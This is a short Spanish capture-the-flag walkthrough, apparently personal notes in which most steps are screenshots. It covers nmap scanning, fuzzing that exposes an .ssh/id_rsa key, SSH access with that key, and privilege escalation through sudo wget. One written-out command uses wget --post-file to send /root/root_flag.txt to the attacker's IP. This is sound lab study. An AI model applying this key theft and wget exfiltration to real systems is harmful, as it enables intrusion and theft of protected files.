Hacemos el escaneo con nmap:
![[Mis apuntes/ANEXOS/Pasted image 20230924110158.png]]
Y esto es lo que corre por el puerto 80:
![[Mis apuntes/ANEXOS/Pasted image 20230924110333.png]]
Si hacemos fuzzing nos encontramos con el directorio sitemap:
![[Mis apuntes/ANEXOS/Pasted image 20230924110255.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230924110343.png]]
Si volvemos a hacer fuzzing, nos encontramos con un .ssh, pero debemos usar el diccionario de common.txt:
![[Mis apuntes/ANEXOS/Pasted image 20230924110445.png]]
Donde nos encontramos con un id_rsa:
![[Mis apuntes/ANEXOS/Pasted image 20230924110523.png]]
Nos lo guardamos:
![[Mis apuntes/ANEXOS/Pasted image 20230924110602.png]]
Damos permisos 600 a este id_rsa y entramos a la máquina víctima:
![[Mis apuntes/ANEXOS/Pasted image 20230924110828.png]]
Una vez dentro, ejecutamos sudo -l y podemos ver que podemos ejecutar como root el comando wget:
![[Mis apuntes/ANEXOS/Pasted image 20230924110916.png]]
Por tanto vamos a subir como sudo la flag de root a nuestra máquina atacante:
```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.8.100.91
```
![[Mis apuntes/ANEXOS/Pasted image 20230924111355.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230924111402.png]]
